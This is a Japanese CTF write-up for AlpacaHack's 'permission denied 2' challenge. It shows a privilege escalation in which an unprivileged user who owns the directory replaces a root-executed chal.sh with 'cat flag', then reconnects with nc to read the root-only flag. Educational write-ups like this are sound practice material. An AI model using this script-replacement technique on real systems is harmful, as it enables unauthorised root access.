# permission denied 2

https://alpacahack.com/daily/challenges/permission-denied-2

## 問題の概要

前回の問題 [permission denied](https://alpacahack.com/daily/challenges/permission-denied) の類問のようです。

サーバーに接続すると `root` 権限で `chal.sh` が実行されます。

```bash
echo Alpaca{REDACTED} |
install -m 400 /dev/stdin flag.txt
runuser -u alpaca -- sh
rm flag.txt
```

今回は `flag.txt` の作成時点で `root` ユーザーからしか読み取れないようにされており、`alpaca` ユーザーでシェルを起動します。

また、`chal.sh` は `/home/alpaca` に配置され、ここで実行されています。

```bash
$ ls -la
total 32
drwx------ 1 alpaca alpaca 4096 Apr 29 16:16 .
drwxr-xr-x 1 root   root   4096 Apr 29 15:22 ..
-rw-r--r-- 1 alpaca alpaca  220 Mar  8 15:21 .bash_logout
-rw-r--r-- 1 alpaca alpaca 3526 Mar  8 15:21 .bashrc
-rw-r--r-- 1 alpaca alpaca  807 Mar  8 15:21 .profile
-r-------- 1 root   root     95 Apr 23 02:38 chal.sh
-r-------- 1 root   root     17 Apr 29 16:16 flag.txt
```

## 解法

前回の問題と同様に、`flag.txt` や `chal.sh` は `alpaca` ユーザーからは読み取ることができません。

しかし、`.` の owner が `alpaca:alpaca` で rwx の権限があるため、`chal.sh` を削除・移動して新しい `chal.sh` を作成することができます。

`chal.sh` は `root` ユーザーで実行されるため、`root` ユーザーしか読み取れないファイルも読み出すことができます。

## 解答に使用した入力

`flag.txt` が削除されないようにいったん退避させ、`chal.sh` を作り直します。

```bash
$ nc localhost 1337
$ mv flag.txt flag
$ rm chal.sh
$ echo "cat flag" > chal.sh
```

再びサーバーに接続すると、`chal.sh` が実行されて `flag` の内容が表示されます。

```bash
$ nc localhost 1337
Alpaca{REDACTED}
```
